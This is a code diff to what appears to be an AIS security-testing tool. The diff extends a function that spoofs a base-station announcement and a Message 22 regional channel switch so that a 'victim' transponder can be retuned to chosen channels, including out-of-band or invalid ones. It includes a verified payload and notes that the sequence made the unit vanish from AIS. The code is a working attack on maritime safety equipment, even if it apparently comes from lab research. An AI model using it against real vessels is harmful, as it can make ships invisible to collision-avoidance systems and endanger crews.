@@ -707,22 +707,27 @@ def build_chanmgmt(ctx):
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
 
 
-def build_chanmgmt_switch(ctx):
+def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None):
     """EXACT replica of the sequence that vanished the unit in the first successful run: announce
     the base as its OWN step, then send the base channel switch ALONE -- no Msg 4 in the same
-    burst, no ship command first, and (when run without --clear-region) no position jumping. The
-    transmitted Msg 22 is byte-identical to the one that worked (verified against that capture:
-    payload F03Owsj2B2D6f5QUVeGO31m1P000). Run on a CLEAN unit with no stored regional area; if the
-    unit already has a region, clear it via a front-panel factory reset, NOT with --clear-region,
-    because the position jump is one of the things that regressed the later runs."""
+    burst, no ship command first, and (when run without --clear-region) no position jumping. With
+    the default target (2084/2085) the transmitted Msg 22 is byte-identical to the one that worked
+    (verified: payload F03Owsj2B2D6f5QUVeGO31m1P000). Pass ch_a/ch_b to retune to a different
+    target -- e.g. an out-of-AIS-band marine channel (2001 ~156 MHz) or an invalid value (0, 4095)
+    -- to test whether the unit clamps the channel field or emits AIS outside the AIS band. Run on
+    a CLEAN unit (front-panel factory reset if it already holds a region; NOT --clear-region). The
+    unit applies only the FIRST Msg 22 per clean state, so test ONE target per run."""
+    ch_a = ALT_CH_A if ch_a is None else ch_a
+    ch_b = ALT_CH_B if ch_b is None else ch_b
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
     return [
         ("cm_announce_base",
             [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
               "Msg4 base-station announcement")]),
         ("cm_m22_base_altchan",
-            [(_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
-              f"M22 (base) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect victim leaves AIS1/AIS2")]),
+            [(_m22_regional(BASE_MMSI, vlat, vlon, ch_a, ch_b),
+              f"M22 (base) regional switch to {ch_a}/{ch_b} -- expect victim leaves AIS1/AIS2 "
+              f"(check serial ACA for the applied channel)")]),
     ]
 
 
@@ -1014,6 +1019,12 @@ def main():
                          "ship then base), automatically clearing the regional area before each so "
                          "the unit's area-lock never blocks a later command. Long (~35-40 min) but "
                          "self-recovers the unit at the end. Recorder on AB throughout.")
+    ap.add_argument("--switch-ch-a", type=int, default=None,
+                    help="override the channel-switch target channel A (default 2084). Use to test "
+                         "out-of-AIS-band (e.g. 2001 ~156 MHz) or invalid (0, 4095) channels with "
+                         "--chanmgmt-switch-only. ONE target per clean run; check the serial ACA.")
+    ap.add_argument("--switch-ch-b", type=int, default=None,
+                    help="override the channel-switch target channel B (default 2085)")
     ap.add_argument("--chanmgmt-gentle", action="store_true",
                     help="run ONLY the non-channel base-station commands (M16 rate, M20 slots, M23 "
                          "group), base then ship, in one clean pass -- no channel change, no "
@@ -1280,7 +1291,8 @@ def main():
 
         # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
         if args.chanmgmt or args.chanmgmt_only or args.chanmgmt_switch_only:
-            cm = build_chanmgmt_switch(ctx) if args.chanmgmt_switch_only else build_chanmgmt(ctx)
+            cm = (build_chanmgmt_switch(ctx, args.switch_ch_a, args.switch_ch_b)
+                  if args.chanmgmt_switch_only else build_chanmgmt(ctx))
             if args.chanmgmt_no_switch and not args.chanmgmt_switch_only:
                 # drop the channel-switch cells; keep everything the unit self-recovers from, so a
                 # repeat run never strands it off-channel (recovery is a painful manual overwrite).
